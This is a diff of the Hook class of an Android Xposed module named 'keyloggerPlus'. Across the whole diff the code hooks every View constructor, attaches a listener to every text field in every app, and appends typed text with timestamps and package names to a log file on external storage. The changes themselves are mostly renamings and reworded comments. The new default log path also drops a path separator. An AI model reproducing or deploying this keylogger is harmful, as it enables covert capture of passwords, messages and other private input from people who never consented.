@@ -18,40 +18,42 @@ import de.robv.android.xposed.XposedBridge;
 import de.robv.android.xposed.XposedHelpers;
 
 public class Hook implements IXposedHookZygoteInit {
-	
-	public static final String SP_NAME = "settings";
-	public static final String SPKEY_ACTIVE = "active";
-	public static final String SPKEY_LOGPATH = "path";
-	
+
+	public static final String mSharedPrefs = "settings";
+	public static final String mActive = "active";
+	public static final String mLogPath = "path";
+
 	private BufferedWriter mWriter;
 	private String mCache = "";
 	private XSharedPreferences mXsp;
-	
+
 	@Override
 	public void initZygote(StartupParam startupParam) throws Throwable {
-		//Getting the preferences
-		mXsp = new XSharedPreferences("com.sscsps.keyloggerPlus", SP_NAME);
-		
-		//Disable the module if it is desired
-		if (!mXsp.getBoolean(SPKEY_ACTIVE, false)) {
+
+		//getting SharedPreferences from app
+		mXsp = new XSharedPreferences("com.sscsps.keyloggerPlus", mSharedPrefs);
+		//Disable the module if it is not enabled in app.
+		if (!mXsp.getBoolean(mActive, false)) {
 			XposedBridge.log("the module is not activated.");
 			return;
 		}
-		//Getting the View class
-		Class clazz = XposedHelpers.findClass("android.view.View", null);
-		//Hooking it
-		XposedBridge.hookAllConstructors(clazz, new XC_MethodHook(){
+
+		//Getting the View class on android
+		Class c = XposedHelpers.findClass("android.view.View", null);
+		//Hooking it to get access.
+		XposedBridge.hookAllConstructors(c, new XC_MethodHook(){
 			
 			@Override
 			protected void afterHookedMethod(MethodHookParam param) throws Throwable {
 				super.afterHookedMethod(param);
 				try {
-					//Dont hook it if its not an instance of EditText
+					//if its not an instance of EditText, no need to hook it.
 					if (!(param.thisObject instanceof EditText))
 						return;
 					
-					//Cast this object into an EditText
+					//Cast this object into an EditText object
 					final EditText et = (EditText) param.thisObject;
+
 					//Adding a listener
 					et.addTextChangedListener(new TextWatcher() {
 
@@ -79,16 +81,18 @@ public class Hook implements IXposedHookZygoteInit {
 			
 		});
 	}
-	
-	private synchronized void write(String id, String text) {
-		//Do nothing if the text is empty or its the same as before
+
+
+	private void write(String packageName, String text) {
+
+		//Don't need to do anything if the "text" is as same as before or is empty.
 		if (text.equals("") || text.equals(mCache))
 			return;
-		
+
 		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
 		if (mWriter == null)
 			try {
-				mWriter = new BufferedWriter(new FileWriter(mXsp.getString(SPKEY_LOGPATH, Environment.getExternalStorageDirectory() + "/key.keyloggerPlus"), true));
+				mWriter = new BufferedWriter(new FileWriter(mXsp.getString(mLogPath, Environment.getExternalStorageDirectory() + "keylogs/log.txt"), true));
 			} catch (IOException e1) {
 				return;
 			}
@@ -98,7 +102,7 @@ public class Hook implements IXposedHookZygoteInit {
 
 		try {
 			//Write it
-			mWriter.append(currentDateTimeString + ">" + id + ">" + text);
+			mWriter.append(currentDateTimeString + ">" + packageName + ">" + text);
 			mWriter.newLine();
 			mWriter.flush();
 			//Refresh the cache
@@ -106,5 +110,5 @@ public class Hook implements IXposedHookZygoteInit {
 		} catch (Exception e) {
 			//ignore
 		}
-	}	
+	}
 }
